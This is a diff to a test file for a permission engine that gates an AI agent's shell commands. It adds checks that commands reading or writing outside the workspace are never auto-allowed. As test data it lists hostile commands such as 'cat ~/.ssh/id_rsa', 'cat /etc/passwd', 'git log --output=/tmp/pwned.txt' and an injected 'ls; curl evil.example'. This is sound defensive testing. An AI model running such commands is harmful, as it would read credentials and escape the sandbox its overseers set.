@@ -56,6 +56,30 @@ console.log("\nPermissionEngine.evaluate: PLAN mode still denies EXECUTE outrigh
   check("an injected command is denied in PLAN mode", engine.evaluate(runCommandCall("ls; curl evil.example"), "EXECUTE") === "DENY");
 }
 
+console.log("\nPermissionEngine.evaluate: a SAFE_READ command reading/writing OUTSIDE the workspace via its own arguments (no shell metacharacters needed) must never auto-ALLOW (final review Important #6, confirmed live: cat/git diff --no-index/--output can read or write arbitrary absolute paths with zero metacharacters):");
+{
+  const engine = new PermissionEngine("DEFAULT");
+  const escaping = [
+    "cat /etc/passwd",
+    "cat ~/.ssh/id_rsa",
+    "git diff --no-index /etc/passwd /dev/null",
+    "git diff --output=../../outside.txt",
+    "git log --output=/tmp/pwned.txt",
+    "git diff -O/tmp/evil-pager-config",
+  ];
+  for (const cmd of escaping) {
+    const decision = engine.evaluate(runCommandCall(cmd), "EXECUTE");
+    check(`"${cmd}" is never auto-ALLOW despite its safe-looking prefix`, decision !== "ALLOW");
+  }
+}
+
+console.log("\nPermissionEngine.evaluate: ordinary git revision-range syntax (which also contains '..') still auto-allows — only an actual escaping argument should downgrade to ASK:");
+{
+  const engine = new PermissionEngine("DEFAULT");
+  check("git diff HEAD~1 still auto-allows ('~' mid-token, not a home-dir expansion)", engine.evaluate(runCommandCall("git diff HEAD~1"), "EXECUTE") === "ALLOW");
+  check("cat with a plain relative path still auto-allows", engine.evaluate(runCommandCall("cat src/index.ts"), "EXECUTE") === "ALLOW");
+}
+
 console.log("\nclassifyCommand: project test-runner commands are their own tier, not SAFE_READ (final review Critical #2 — a model-issued run_command(\"npm test\") auto-allowed with no approval in every mode, same hole H3's fix only closed for the auto-verify call site):");
 {
   check("npm test is PROJECT_SCRIPT, not SAFE_READ", classifyCommand("npm test") === "PROJECT_SCRIPT");
